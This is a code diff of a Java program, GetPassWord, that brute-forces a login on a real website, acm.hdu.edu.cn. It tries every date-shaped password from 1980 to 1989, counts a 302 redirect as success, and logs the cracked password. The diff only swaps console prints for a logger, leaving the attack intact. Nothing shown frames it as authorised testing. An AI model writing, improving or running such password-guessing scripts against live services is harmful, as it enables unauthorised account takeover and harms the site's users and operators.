@@ -15,14 +15,19 @@ import org.apache.http.impl.client.DefaultHttpClient;
 import org.apache.http.message.BasicNameValuePair;
 import org.apache.http.params.HttpParams;
 import org.apache.http.protocol.HTTP;
+import org.slf4j.Logger;
+import org.slf4j.LoggerFactory;
 
 public class GetPassWord {
+
+	private static Logger logger = LoggerFactory.getLogger(GetPassWord.class);
+
 	public static void main(String[] args) throws Exception, IOException {
 		for(int i=1980; i<1990; i++){
 			for(int j=1; j<=12; j++){
 				for(int k=1; k<=31; k++){
 					String passwd =""+ i + ( j<10 ? "0"+j:j+"" ) + ( k<10 ? "0"+k:k+"" );
-		//System.out.println(passwd);
+		//logger.info(passwd);
 			HttpClient client = new DefaultHttpClient();
 			HttpPost post = new HttpPost("http://acm.hdu.edu.cn/userloginex.php?action=login");
 			HttpParams httpparam = client.getParams();
@@ -42,17 +47,16 @@ public class GetPassWord {
 			
 			 HttpResponse response = client.execute(post) ;
 			 int stat = response.getStatusLine().getStatusCode();
-			 System.out.println(stat);
 			 if(stat == 302){
-				 System.out.println(passwd);
+				 logger.info(passwd);
 				 return;
 			 }
-//			 System.out.println();
+//			 logger.info();
 //			 BufferedReader br = null;
 //			 br = new BufferedReader(new InputStreamReader(response.getEntity().getContent()));
 //			 String line = null;
 //				while ((line = br.readLine()) != null) {
-//					System.out.println(line);
+//					logger.info(line);
 //				}
 			 Thread.sleep(1000);
 			 
